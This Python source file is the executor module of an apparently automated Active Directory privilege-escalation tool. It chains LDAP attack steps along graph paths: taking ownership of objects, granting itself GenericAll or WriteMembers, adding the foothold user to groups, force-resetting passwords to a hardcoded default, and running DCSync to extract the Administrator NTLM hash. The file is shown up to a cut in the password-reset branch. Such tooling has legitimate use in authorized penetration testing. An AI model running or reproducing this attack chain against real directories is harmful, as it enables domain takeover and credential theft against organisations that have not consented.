import logging
from types import SimpleNamespace
from typing import Any, Optional

from core.database import DatabaseManager
from core.logger import logger
from core.pathfinder.rules import get_node_type, is_valid_path, normalize_path_dcsync
from core.privesc.modules.shared import (
    PrivescActions,
    format_add_group_member_messages,
    format_attack_completion_message,
    format_force_change_password_messages,
    format_grant_addmember_messages,
    format_memberof_passive_message,
)
from core.privesc.path_utils import path_to_sequence


DEFAULT_RESET_PASSWORD = "Secur3P@ssw0rd!"


def _node_name(node: Any) -> str:
    if isinstance(node, dict):
        return str(node.get("name") or node.get("distinguishedname") or node.get("dn") or "")
    return str(getattr(node, "name", None) or getattr(node, "distinguishedname", None) or node or "")


def _friendly_name(value: Any) -> str:
    name = _node_name(value)
    if "@" in name:
        name = name.split("@")[0]
    return name.replace("_", " ").strip()


def _resolve_target_dn(actions: PrivescActions, node: Any) -> Optional[str]:
    if isinstance(node, dict):
        raw = node.get("distinguishedname") or node.get("dn") or node.get("name")
    else:
        raw = getattr(node, "distinguishedname", None) or getattr(node, "dn", None) or getattr(node, "name", None) or node
    if not raw:
        return None
    raw = str(raw)
    if raw.upper().startswith("CN="):
        return raw

    # Some domain targets are represented as FQDN (e.g. VIPERTECH.LOCAL) rather than DN.
    # Normalize these to LDAP DN form so ACL/owner writes target the actual domain object.
    if "=" not in raw and "@" not in raw and "." in raw and actions.domain and raw.lower() == str(actions.domain).lower():
        parts = [part.strip() for part in raw.split(".") if part.strip()]
        if parts:
            return ",".join([f"DC={part}" for part in parts])

    resolved = actions.resolve_distinguished_name(raw)
    return resolved or raw


def _canonicalize_sid(raw_sid):
    if not raw_sid:
        return None
    if isinstance(raw_sid, str):
        return raw_sid
    if isinstance(raw_sid, (bytes, bytearray)):
        from impacket.ldap import ldaptypes

        sid_obj = ldaptypes.LDAP_SID()
        sid_obj.fromString(raw_sid)
        return sid_obj.formatCanonical()
    return str(raw_sid)


def _safe_call(label, fn, *args):
    try:
        return fn(*args)
    except Exception as exc:
        logging.error("%s raised exception: %s", label, exc)
        return False


def _binding_candidates(username: str, domain: str) -> list[str]:
    raw = str(username or "").strip()
    if not raw:
        return []

    candidates: list[str] = []
    seen = set()
    for candidate in [raw, raw.split("\\")[-1] if "\\" in raw else raw, raw.split("@")[0] if "@" in raw else raw]:
        if candidate and candidate not in seen:
            candidates.append(candidate)
            seen.add(candidate)

    if domain:
        netbios = domain.split(".")[0]
        sam = raw.split("\\")[-1] if "\\" in raw else raw.split("@")[0] if "@" in raw else raw
        for candidate in [f"{netbios}\\{sam}", f"{sam}@{domain}"]:
            if candidate not in seen:
                candidates.append(candidate)
                seen.add(candidate)

    return candidates


def _grant_superset_access(actions, target_dn, current_sid, grant_label):
    logging.info("  [*] Granting %s (implemented as FullControl superset)", grant_label)
    return _safe_call("grant_generic_all", actions.grant_generic_all, target_dn, current_sid)


def _grant_group_addmember(actions, group_dn, current_sid):
    logging.info("  [*] Granting WriteMembers on group via member-attribute write")
    return _safe_call("grant_group_addmember", actions.grant_group_addmember, group_dn, current_sid)


def _refresh_bind(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    password = current_auth.get("value")
    if not username or not password:
        return False

    bind_candidates = _binding_candidates(username, actions.domain)
    if not bind_candidates:
        return False

    for bind_user in bind_candidates:
        try:
            if actions.conn.rebind(user=bind_user, password=password):
                return True
        except Exception:
            pass

    logging.error("LDAP rebind failed while refreshing effective privileges for %s (%s)", username, bind_candidates)
    return False


def _switch_identity_after_reset(actions, context, end_node, target_dn):
    candidate_identities = []
    if isinstance(end_node, dict):
        if end_node.get("name"):
            candidate_identities.append(end_node.get("name"))
        if end_node.get("distinguishedname"):
            candidate_identities.append(end_node.get("distinguishedname"))
    if target_dn:
        candidate_identities.append(target_dn)

    for identity in candidate_identities:
        if not identity:
            continue
        if context.switch_identity(identity) and _refresh_bind(actions, context):
            logging.info("  [+] Pivoted execution identity to %s", identity)
            return True

    logging.error("Failed to pivot context identity after password reset")
    return False


def _resolve_current_user_dn(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    if not username:
        return None

    for candidate in _binding_candidates(username, actions.domain):
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved
    return None


def _resolve_source_user_dn(actions, source_user):
    for candidate in _binding_candidates(source_user, actions.domain):
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved
    return None


def _flatten_path(path):
    if isinstance(path, list) and path and isinstance(path[0], dict) and "source" in path[0]:
        sequence = []
        for step in path:
            sequence.append(step.get("source", {}))
            sequence.append(step.get("relationship"))
            sequence.append(step.get("target", {}))
        return sequence
    return path_to_sequence(path)


def _map_action(rel_type: str, target_type: str) -> str:
    rel = str(rel_type or "").strip()
    kind = str(target_type or "").strip().lower()

    if rel == "MemberOf":
        return "noop"
    if rel == "DCSync":
        return "dcsync"
    if rel == "AddMember":
        return "add_group_member"
    if rel == "ForceChangePassword":
        return "reset_password"
    if rel == "AllExtendedRights":
        return "reset_password" if kind == "user" else "dcsync" if kind == "domain" else "noop"
    if rel == "GenericWrite":
        return "add_group_member" if kind == "group" else "noop"
    if rel == "GenericAll":
        if kind == "user":
            return "grant_genericall_then_reset_password"
        if kind == "group":
            return "add_group_member"
        if kind == "domain":
            return "dcsync"
    if rel == "Owns" and kind == "user":
        return "grant_genericall_switch_context_then_reset_password"
    if rel == "WriteDacl":
        if kind == "user":
            return "grant_genericall_switch_context_then_reset_password"
        if kind == "group":
            return "grant_addmember_then_add_group_member"
        if kind == "domain":
            return "grant_genericall_then_dcsync"
    if rel == "WriteOwner":
        if kind == "user":
            return "take_ownership_grant_genericall_then_reset_password"
        if kind == "group":
            return "take_ownership_grant_addmember_then_add_group_member"
        if kind == "domain":
            return "take_ownership_grant_genericall_then_dcsync"
    if rel == "Owns":
        if kind == "user":
            return "take_ownership_grant_genericall_then_reset_password"
        if kind == "group":
            return "grant_addmember_then_add_group_member"
        if kind == "domain":
            return "take_ownership_grant_genericall_then_dcsync"
    return ""


def build_strict_action_plan(path, db=None):
    if db is None:
        db = DatabaseManager()
        db.connect()

    normalized = normalize_path_dcsync(path, db)
    if not is_valid_path(normalized, db):
        raise RuntimeError("Path contains disallowed edge/target pairs after strict validation")

    plan = []
    for i in range(0, len(normalized) - 2, 2):
        start_node = normalized[i]
        rel_type = normalized[i + 1]
        end_node = normalized[i + 2]
        target_type = get_node_type(end_node, db)
        action = _map_action(rel_type, target_type)
        if not action:
            raise RuntimeError(f"No strict action mapped for {rel_type} -> {target_type}")

        plan.append({
            "step": len(plan) + 1,
            "start_node": start_node,
            "end_node": end_node,
            "rel_type": rel_type,
            "target_type": target_type,
            "action": action,
        })

    return plan


class StrictPrivescExecutor:
    def __init__(self, conn, domain, dc_ip, context, default_reset_password="Secur3P@ssw0rd!"):
        self.conn = conn
        self.domain = domain
        self.dc_ip = dc_ip
        self.context = context
        self.project_id = getattr(context, "project_id", None)
        self.actions = PrivescActions(SimpleNamespace(conn=conn, domain=domain, dc_ip=dc_ip))
        self._last_plan = []
        self.default_reset_password = default_reset_password or "Secur3P@ssw0rd!"

    def _audit_event(self, event_type, level, message, target, **details):
        payload = {"target": target, **details}
        project_id = getattr(self.context, "project_id", None) or self.project_id
        getattr(logger, level.lower(), logger.info)(
            "PRIVESC",
            event_type,
            message,
            project_id=project_id,
            source="web.app",
            details=payload,
        )

    def _is_last_step(self, item):
        return item.get("step") == len(self._last_plan or [])

    def _completion_context_message(self, target_type, target_name, proof_value):
        kind = (target_type or "").lower()
        if kind == "group":
            return format_attack_completion_message("group", proof_value or target_name, target_name)
        if kind == "domain":
            return format_attack_completion_message("domain", "Administrator", proof_value)
        if kind == "user":
            return format_attack_completion_message("user", target_name, proof_value)
        return format_attack_completion_message("", target_name, proof_value)

    def execute_path(self, path):
        flat_path = _flatten_path(path)
        plan = build_strict_action_plan(flat_path)
        self._last_plan = plan

        results = []
        success_overall = True
        for item in plan:
            step_result = self._execute_step(item)
            if "target_type" not in step_result:
                step_result["target_type"] = item.get("target_type")
            results.append(step_result)
            if not step_result.get("success"):
                success_overall = False
                break

            # Rebind after each successful step so newly acquired rights (group membership/ACL)
            # are reflected before executing the next edge in the chain.
            if item.get("step") < len(self._last_plan or []):
                if not _refresh_bind(self.actions, self.context):
                    target_name = _node_name(item.get("end_node"))
                    self._audit_event(
                        "privesc.context.rebind.warning",
                        "warning",
                        "Post-step LDAP rebind failed; subsequent permission-dependent actions may fail.",
                        target_name,
                        action="ContextRebind",
                        current_identity=self.context.get_current_auth().get("username"),
                        ldap_user=getattr(self.actions.conn, "user", None),
                        ldap_result=getattr(self.actions.conn, "result", {}),
                    )

        return {"success": success_overall, "steps": results}

    def _execute_step(self, item):
        step = item["step"]
        rel_type = item["rel_type"]
        target_type = item["target_type"]
        action = item["action"]
        target_name = _node_name(item["end_node"])
        current_auth = self.context.get_current_auth()
        current_password = current_auth.get("value")
        current_username = current_auth.get("username")
        current_sid = _canonicalize_sid(self.actions.get_object_sid(current_username))
        target_dn = _resolve_target_dn(self.actions, item["end_node"])

        logging.info("[%s/%s] %s -> %s (%s) => %s", step, len(self._last_plan or [0]), rel_type, target_name, target_type, action)

        if action == "noop":
            passive_messages = format_memberof_passive_message()
            self._audit_event("privesc.memberof.passive", "info", passive_messages["result_message"], target_name, action="MemberOf", passive=True)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": passive_messages["result_message"], "action_message": None, "result_message": passive_messages["result_message"], "context_message": None}

        if action == "dcsync":
            if not current_password:
                failure_message = "DCSync requires active credentials to perform the domain replication request."
                self._audit_event("privesc.dcsync.failed", "error", failure_message, target_name, target_dn=target_dn, action="DCSync", current_identity=current_username, current_username=current_auth.get("username"))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": f"Performing DCSync against {target_name}", "result_message": failure_message, "context_message": None}

            action_message = f"Performing DCSync against {target_name}"
            self._audit_event("privesc.dcsync.started", "info", action_message, target_name, target_dn=target_dn, action="DCSync", current_identity=current_username, current_username=current_auth.get("username"))
            success = _safe_call("dcsync", self.actions.dcsync, current_password)
            hash_value = success if isinstance(success, str) else getattr(self.actions, "last_dcsync_hash", None)
            success_bool = bool(success)
            message = "DCSync completed and the domain credentials have been harvested." if success_bool else "DCSync failed after the domain replication request."
            if not success_bool:
                self._audit_event("privesc.dcsync.failed", "error", message, target_name, target_dn=target_dn, action="DCSync", current_identity=current_username, current_username=current_auth.get("username"))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": message, "action_message": action_message, "result_message": message, "context_message": None, "proof_value": hash_value}

            if success_bool and self._is_last_step(item):
                completion_message = self._completion_context_message("domain", target_name, hash_value or "")
                self._audit_event("privesc.context.completed", "info", completion_message, target_name, target_dn=target_dn, action="ContextComplete")
                result_message = f"Administrator NTLM hash extracted: {hash_value}"
                self._audit_event("privesc.dcsync.success", "info", result_message, target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=current_username, current_username=current_auth.get("username"))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": completion_message, "action_message": f"Extracting NTLM hash from {target_name}", "result_message": result_message, "context_message": completion_message, "proof_value": hash_value}

            self._audit_event("privesc.dcsync.success", "info", message, target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=current_username, current_username=current_auth.get("username"))
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message, "action_message": action_message, "result_message": message, "context_message": None, "proof_value": hash_value}

        if action == "grant_addmember_then_add_group_member":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteDacl/Owns/WriteOwner on group requires a resolvable target DN and SID."}

            grant_action_message = f"Granting WriteMembers on {target_name} to {current_auth.get('username') or 'the foothold user'}"
            self._audit_event("privesc.addmember.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="WriteMembers", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))
            if not _grant_group_addmember(self.actions, target_dn, current_sid):
                failure_message = f"Failed to grant WriteMembers on {target_name}."
                self._audit_event(
                    "privesc.addmember.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteMembers",
                    current_identity=current_auth.get("username"),
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_grant_diagnostic", None),
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": grant_action_message, "grant_result_message": None, "add_action_message": None, "result_message": failure_message, "context_message": None}
            if not _refresh_bind(self.actions, self.context):
                failure_message = f"Rebind failed after granting WriteMembers on {target_name}."
                self._audit_event(
                    "privesc.addmember.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteMembers",
                    current_identity=current_auth.get("username"),
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions.conn, "result", {}),
                    diagnostic="Grant succeeded but LDAP rebind with current context credentials failed.",
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": grant_action_message, "grant_result_message": None, "add_action_message": None, "result_message": failure_message, "context_message": None}
            grant_result_message = f"Successfully granted WriteMembers on {target_name} to {current_auth.get('username') or 'the foothold user'}."
            self._audit_event("privesc.addmember.grant.success", "info", grant_result_message, target_name, target_dn=target_dn, action="WriteMembers", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))

            current_user_dn = _resolve_current_user_dn(self.actions, self.context)
            if not current_user_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unable to resolve the current user after granting WriteMembers on {target_name}.", "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": None, "result_message": f"Unable to resolve the current user after granting WriteMembers on {target_name}.", "context_message": None}
            current_username = current_auth.get("username") or current_user_dn
            member_name = str(current_username).split("\\")[-1].split("@")[0]
            add_messages = format_add_group_member_messages(member_name, target_name, success=True)
            self._audit_event("privesc.add_group_member.started", "info", add_messages["action_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))

            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, current_user_dn)
            if not success:
                ldap_result = getattr(self.actions, "last_group_member_result", None)
                failure_message = getattr(self.actions, "last_group_member_message", None) or f"Failed to add {member_name} to {target_name} group."
                frontend_message = f"Failed to add {member_name} to {target_name} group."
                self._audit_event("privesc.add_group_member.failed", "error", failure_message, target_name, target_dn=target_dn, member=member_name, action="AddMember", ldap_result=ldap_result, current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": frontend_message, "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": add_messages["action_message"], "result_message": frontend_message, "context_message": None}

            self._audit_event("privesc.add_group_member.success", "info", add_messages["result_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": add_messages["result_message"], "action_message": grant_action_message, "grant_result_message": grant_result_message, "add_action_message": add_messages["action_message"], "result_message": add_messages["result_message"], "context_message": None, "proof_value": member_name}

        if action == "take_ownership_grant_addmember_then_add_group_member":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteOwner on group requires a resolvable target DN and SID."}

            foothold_user = current_auth.get("username") or "the foothold user"

            owner_action_message = f"Making {foothold_user} the owner of {target_name}"
            self._audit_event("privesc.owner.takeover.started", "info", owner_action_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _safe_call("set_owner", self.actions.set_owner, target_dn, current_sid):
                owner_failure_message = f"Failed to make {foothold_user} the owner of {target_name}."
                self._audit_event(
                    "privesc.owner.takeover.failed",
                    "error",
                    owner_failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteOwner",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_owner_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_owner_diagnostic", None),
                    owner_status=getattr(self.actions, "last_owner_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": owner_failure_message, "action_message": owner_action_message, "grant_result_message": None, "add_action_message": None, "result_message": owner_failure_message, "context_message": None}

            owner_success_message = f"Successfully made {foothold_user} the owner of {target_name}."
            self._audit_event("privesc.owner.takeover.success", "info", owner_success_message, target_name, target_dn=target_dn, action="WriteOwner", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not self.context.switch_identity(foothold_user) or not _refresh_bind(self.actions, self.context):
                context_failure_message = f"Failed to switch context to user {foothold_user}."
                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": None, "result_message": context_failure_message, "context_message": None}

            context_success_message = f"Context changed to user {foothold_user} successfully."
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            grant_action_message = f"Granting WriteMembers on {target_name} to {foothold_user}"
            self._audit_event("privesc.addmember.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="WriteMembers", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _grant_group_addmember(self.actions, target_dn, current_sid):
                failure_message = f"Failed to grant WriteMembers on {target_name}."
                self._audit_event(
                    "privesc.addmember.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteMembers",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_grant_diagnostic", None),
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "result_message": failure_message, "context_message": context_success_message}

            if not _refresh_bind(self.actions, self.context):
                failure_message = f"Rebind failed after granting WriteMembers on {target_name}."
                self._audit_event(
                    "privesc.addmember.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="WriteMembers",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions.conn, "result", {}),
                    diagnostic="Grant succeeded but LDAP rebind with current context credentials failed.",
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": owner_success_message, "add_action_message": grant_action_message, "result_message": failure_message, "context_message": context_success_message}

            grant_result_message = f"Successfully granted WriteMembers on {target_name} to {foothold_user}."
            self._audit_event("privesc.addmember.grant.success", "info", grant_result_message, target_name, target_dn=target_dn, action="WriteMembers", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            current_user_dn = _resolve_current_user_dn(self.actions, self.context)
            if not current_user_dn:
                failure_message = f"Unable to resolve the current user after granting WriteMembers on {target_name}."
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {grant_result_message}", "add_action_message": None, "result_message": failure_message, "context_message": context_success_message}

            member_name = str(foothold_user).split("\\")[-1].split("@")[0]
            add_messages = format_add_group_member_messages(member_name, target_name, success=True)
            self._audit_event("privesc.add_group_member.started", "info", add_messages["action_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, current_user_dn)
            if not success:
                ldap_result = getattr(self.actions, "last_group_member_result", None)
                failure_message = getattr(self.actions, "last_group_member_message", None) or f"Failed to add {member_name} to {target_name} group."
                frontend_message = f"Failed to add {member_name} to {target_name} group."
                self._audit_event("privesc.add_group_member.failed", "error", failure_message, target_name, target_dn=target_dn, member=member_name, action="AddMember", ldap_result=ldap_result, current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": frontend_message, "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {grant_result_message}", "add_action_message": add_messages["action_message"], "result_message": frontend_message, "context_message": context_success_message}

            self._audit_event("privesc.add_group_member.success", "info", add_messages["result_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": add_messages["result_message"], "action_message": owner_action_message, "grant_result_message": f"{owner_success_message} {grant_result_message}", "add_action_message": add_messages["action_message"], "result_message": add_messages["result_message"], "context_message": context_success_message, "proof_value": member_name}

        if action == "grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteDacl on domain requires a resolvable target DN and SID."}

            foothold_user = current_auth.get("username") or "the foothold user"
            grant_action_message = f"Granting GenericAll on {target_name} to {foothold_user}"
            self._audit_event("privesc.genericall.grant.started", "info", grant_action_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                failure_message = f"Failed to grant GenericAll on {target_name}."
                self._audit_event(
                    "privesc.genericall.grant.failed",
                    "error",
                    failure_message,
                    target_name,
                    target_dn=target_dn,
                    action="GenericAll",
                    current_identity=foothold_user,
                    ldap_user=getattr(self.actions.conn, "user", None),
                    ldap_result=getattr(self.actions, "last_grant_result", None) or getattr(self.actions.conn, "result", {}),
                    diagnostic=getattr(self.actions, "last_grant_diagnostic", None),
                    grant_status=getattr(self.actions, "last_grant_status", None),
                )
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": grant_action_message, "grant_result_message": None, "add_action_message": None, "password_action_message": None, "result_message": failure_message, "context_message": None}

            genericall_success_message = f"Successfully granted GenericAll on {target_name} to {foothold_user}."
            self._audit_event("privesc.genericall.grant.success", "info", genericall_success_message, target_name, target_dn=target_dn, action="GenericAll", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not self.context.switch_identity(foothold_user) or not _refresh_bind(self.actions, self.context):
                context_failure_message = f"Failed to switch context to user {foothold_user}."
                self._audit_event("privesc.context.switch.failed", "error", context_failure_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": context_failure_message, "action_message": grant_action_message, "grant_result_message": genericall_success_message, "add_action_message": None, "password_action_message": None, "result_message": context_failure_message, "context_message": None}

            context_success_message = f"Context changed to user {foothold_user} successfully."
            self._audit_event("privesc.context.switch.success", "info", context_success_message, target_name, target_dn=target_dn, action="ContextSwitch", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            dcsync_action_message = f"Performing DCSync against {target_name}"
            self._audit_event("privesc.dcsync.started", "info", dcsync_action_message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)

            dcsync_auth = self.context.get_current_auth()
            dcsync_password = dcsync_auth.get("value")
            if not dcsync_password:
                failure_message = "DCSync requires active credentials after context switch."
                self._audit_event("privesc.dcsync.failed", "error", failure_message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_message, "action_message": grant_action_message, "grant_result_message": genericall_success_message, "add_action_message": None, "password_action_message": dcsync_action_message, "result_message": failure_message, "context_message": context_success_message}

            success = _safe_call("dcsync", self.actions.dcsync, dcsync_password)
            hash_value = success if isinstance(success, str) else getattr(self.actions, "last_dcsync_hash", None)
            success_bool = bool(success)
            message = "DCSync completed and the domain credentials have been harvested." if success_bool else "DCSync failed after the WriteDacl chain."

            if not success_bool:
                self._audit_event("privesc.dcsync.failed", "error", message, target_name, target_dn=target_dn, action="DCSync", current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": message, "action_message": grant_action_message, "grant_result_message": genericall_success_message, "add_action_message": None, "password_action_message": dcsync_action_message, "result_message": message, "context_message": context_success_message, "proof_value": hash_value}

            if success_bool and self._is_last_step(item):
                completion_message = self._completion_context_message("domain", target_name, hash_value or "")
                self._audit_event("privesc.context.completed", "info", completion_message, target_name, target_dn=target_dn, action="ContextComplete")
                self._audit_event("privesc.dcsync.success", "info", f"Administrator NTLM hash extracted: {hash_value}", target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=foothold_user, current_username=foothold_user)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": completion_message, "action_message": grant_action_message, "grant_result_message": genericall_success_message, "add_action_message": None, "password_action_message": dcsync_action_message, "result_message": f"Administrator NTLM hash extracted: {hash_value}", "context_message": context_success_message, "proof_value": hash_value}

            self._audit_event("privesc.dcsync.success", "info", message, target_name, target_dn=target_dn, action="DCSync", proof_value=hash_value, current_identity=foothold_user, current_username=foothold_user)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message, "action_message": grant_action_message, "grant_result_message": genericall_success_message, "add_action_message": None, "password_action_message": dcsync_action_message, "result_message": message, "context_message": context_success_message, "proof_value": hash_value}

        if action == "add_group_member":
            if not target_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "AddMember requires a resolvable target group DN."}

            current_user_dn = _resolve_current_user_dn(self.actions, self.context)
            if not current_user_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Unable to resolve the current user for the AddMember action."}

            current_username = current_auth.get("username") or current_user_dn
            member_name = str(current_username).split("\\")[-1].split("@")[0]
            add_messages = format_add_group_member_messages(member_name, target_name, success=True)
            self._audit_event("privesc.add_group_member.started", "info", add_messages["action_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))

            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, current_user_dn)
            if not success:
                ldap_result = getattr(self.actions, "last_group_member_result", None)
                failure_message = getattr(self.actions, "last_group_member_message", None) or f"Failed to add {member_name} to {target_name} group."
                frontend_message = f"Failed to add {member_name} to {target_name} group."
                self._audit_event("privesc.add_group_member.failed", "error", failure_message, target_name, target_dn=target_dn, member=member_name, action="AddMember", ldap_result=ldap_result, current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": frontend_message, "action_message": add_messages["action_message"], "result_message": frontend_message, "context_message": None}

            self._audit_event("privesc.add_group_member.success", "info", add_messages["result_message"], target_name, target_dn=target_dn, member=member_name, action="AddMember", current_identity=current_auth.get("username"), ldap_user=getattr(self.actions.conn, "user", None))
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": add_messages["result_message"], "action_message": add_messages["action_message"], "result_message": add_messages["result_message"], "context_message": None, "proof_value": member_name}

        if action in {"reset_password", "grant_genericall_then_reset_password"}:
            if not target_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "ForceChangePassword requires a resolvable target user DN."}

            foothold_user = current_auth.get("username") or "the foothold user"
            target_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            password_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)

            self._audit_event("privesc.force_change_password.started", "info", password_messages["action_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            if not _safe_call("force_change_password", self.actions.force_change_password, target_dn, self.default_reset_password):
                failure_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=False)
                self._audit_event("privesc.force_change_password.failed", "error", failure_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None), ldap_result=getattr(self.actions.conn, "result", {}))
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": failure_messages["result_message"], "action_message": failure_messages["action_message"], "result_message": failure_messages["result_message"], "context_message": None}

            success_messages = format_force_change_password_messages(target_name, self.default_reset_password, success=True)
            self._audit_event("privesc.force_change_password.success", "info", success_messages["result_message"], target_name, target_dn=target_dn, password=self.default_reset_password, action="ForceChangePassword", current_identity=foothold_user, ldap_user=getattr(self.actions.conn, "user", None))

            self.context.add_credential(target_identity, "password", self.default_reset_password)
            if not _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                context_failure_message = f"Password reset succeeded, but failed to change context to user {target_identity}."
